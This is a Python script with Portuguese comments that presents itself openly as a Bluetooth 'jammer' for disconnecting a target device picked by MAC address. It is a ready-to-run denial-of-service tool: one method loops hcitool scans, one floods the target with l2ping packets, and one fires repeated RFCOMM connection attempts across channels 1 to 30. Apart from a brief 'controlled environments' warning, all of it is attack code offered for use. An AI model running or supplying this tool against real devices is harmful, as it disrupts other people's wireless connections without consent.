#!/usr/bin/env python3
"""
Script de Interferência Bluetooth (Jammer)
Interfere nas frequências Bluetooth para causar desconexão
REQUER PRIVILÉGIOS ROOT E HARDWARE COMPATÍVEL
"""

import sys
import time
import argparse
import subprocess
import os

def check_root():
    """Verifica se está rodando como root"""
    if os.geteuid() != 0:
        return False
    return True

def check_hciconfig():
    """Verifica se hciconfig está disponível"""
    try:
        result = subprocess.run(['which', 'hciconfig'], 
                              capture_output=True, text=True)
        return result.returncode == 0
    except:
        return False

def set_bluetooth_power(interface='hci0', state='up'):
    """Liga/desliga o adaptador Bluetooth"""
    try:
        cmd = ['hciconfig', interface, state]
        subprocess.run(cmd, check=True, capture_output=True)
        return True
    except:
        return False

def continuous_scan(target_mac, duration=30):
    """
    Escaneamento contínuo para interferir na conexão
    """
    print(f"[*] Iniciando interferência por escaneamento contínuo")
    print(f"[*] Alvo: {target_mac}")
    print(f"[*] Duração: {duration} segundos\n")
    
    start_time = time.time()
    scan_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Executar scan contínuo
            cmd = ['hcitool', 'scan', '--flush']
            subprocess.run(cmd, capture_output=True, timeout=2)
            
            scan_count += 1
            if scan_count % 5 == 0:
                print(f"[*] {scan_count} escaneamentos realizados...")
            
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        print("\n[!] Interferência interrompida")
    except Exception as e:
        print(f"[!] Erro: {e}")
    
    print(f"\n[+] Interferência concluída: {scan_count} escaneamentos")

def l2cap_ping_flood(target_mac, duration=30):
    """
    Flooding de pings L2CAP
    """
    print(f"[*] Iniciando flooding de pings L2CAP")
    print(f"[*] Alvo: {target_mac}\n")
    
    start_time = time.time()
    ping_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Tentar ping L2CAP
            cmd = ['l2ping', '-c', '1', target_mac]
            subprocess.run(cmd, capture_output=True, timeout=1)
            
            ping_count += 1
            if ping_count % 10 == 0:
                print(f"[*] {ping_count} pings enviados...")
            
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[!] Interferência interrompida")
    except Exception as e:
        print(f"[!] Erro: {e}")
    
    print(f"\n[+] Interferência concluída: {ping_count} pings")

def rfcomm_connection_flood(target_mac, duration=30):
    """
    Flooding de tentativas de conexão RFCOMM
    """
    print(f"[*] Iniciando flooding de conexões RFCOMM")
    print(f"[*] Alvo: {target_mac}\n")
    
    start_time = time.time()
    attempt_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Tentar conectar em diferentes canais RFCOMM
            for channel in range(1, 31):
                try:
                    cmd = ['rfcomm', 'connect', '/dev/rfcomm0', target_mac, str(channel)]
                    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE)
                    time.sleep(0.1)
                    proc.terminate()
                    attempt_count += 1
                except:
                    pass
            
            if attempt_count % 50 == 0:
                print(f"[*] {attempt_count} tentativas de conexão...")
            
            time.sleep(0.2)
            
    except KeyboardInterrupt:
        print("\n[!] Interferência interrompida")
    except Exception as e:
        print(f"[!] Erro: {e}")
    
    print(f"\n[+] Interferência concluída: {attempt_count} tentativas")

def main():
    parser = argparse.ArgumentParser(
        description='Interferência Bluetooth (Jammer) - REQUER ROOT',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
AVISO: Este script requer privilégios root!

Exemplos:
  sudo python3 bluetooth_jammer.py --target AA:BB:CC:DD:EE:FF
  sudo python3 bluetooth_jammer.py --target AA:BB:CC:DD:EE:FF --method scan --duration 60
        """
    )
    
    parser.add_argument(
        '--target', '-t',
        required=True,
        help='Endereço MAC do dispositivo alvo'
    )
    
    parser.add_argument(
        '--method', '-m',
        choices=['scan', 'ping', 'rfcomm'],
        default='scan',
        help='Método de interferência (padrão: scan)'
    )
    
    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=30,
        help='Duração em segundos (padrão: 30)'
    )
    
    args = parser.parse_args()
    
    # Verificar root
    if not check_root():
        print("[!] ERRO: Este script requer privilégios root!")
        print("[!] Execute com: sudo python3 bluetooth_jammer.py ...")
        sys.exit(1)
    
    # Verificar ferramentas
    if not check_hciconfig():
        print("[!] Erro: hciconfig não encontrado")
        print("[!] Instale: sudo apt install bluez")
        sys.exit(1)
    
    # Validar MAC
    mac = args.target.upper().replace('-', ':')
    if len(mac) != 17 or mac.count(':') != 5:
        print("[!] Erro: Formato de MAC inválido")
        sys.exit(1)
    
    print("=" * 60)
    print("    INTERFERÊNCIA BLUETOOTH (JAMMER)")
    print("=" * 60)
    print()
    print("[!] AVISO: Use apenas em ambientes controlados!")
    print()
    
    try:
        # Garantir que Bluetooth está ativo
        print("[*] Verificando adaptador Bluetooth...")
        set_bluetooth_power('hci0', 'up')
        time.sleep(1)
        
        # Executar método selecionado
        if args.method == 'scan':
            continuous_scan(mac, duration=args.duration)
        elif args.method == 'ping':
            l2cap_ping_flood(mac, duration=args.duration)
        elif args.method == 'rfcomm':
            rfcomm_connection_flood(mac, duration=args.duration)
            
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário")
    except Exception as e:
        print(f"[!] Erro: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

